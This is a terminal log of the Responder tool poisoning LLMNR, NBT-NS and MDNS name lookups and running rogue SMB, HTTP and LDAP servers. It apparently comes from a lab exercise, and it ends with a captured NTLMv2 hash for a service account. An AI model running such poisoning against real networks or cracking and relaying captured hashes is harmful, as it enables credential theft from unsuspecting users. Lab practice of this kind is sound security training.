â¯ sudo responder -I breachad
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [breachad]
    Responder IP               [10.50.22.10]
    Responder IPv6             [fe80::1b60:3513:1835:8f3c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-30GSD1PZ3VJ]
    Responder Domain Name      [3ES2.LOCAL]
    Responder DCE-RPC Port     [49365]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.200.24.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:46a31832ca17cbdd:C2FB610F6C3E1AC0E75088CCCB59EA39:010100000000000080E53ADE5CF4D801F3801701A4E7EA970000000002000800330045005300320001001E00570049004E002D0033003000470053004400310050005A00330056004A0004003400570049004E002D0033003000470053004400310050005A00330056004A002E0033004500530032002E004C004F00430041004C000300140033004500530032002E004C004F00430041004C000500140033004500530032002E004C004F00430041004C000700080080E53ADE5CF4D80106000400020000000800300030000000000000000000000000200000930CE5C1570B2EEADB6A1A3C0B699BA3AA1A55A16A08D538C80DEB68623B4D5E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320032002E00310030000000000000000000
[+] Exiting...

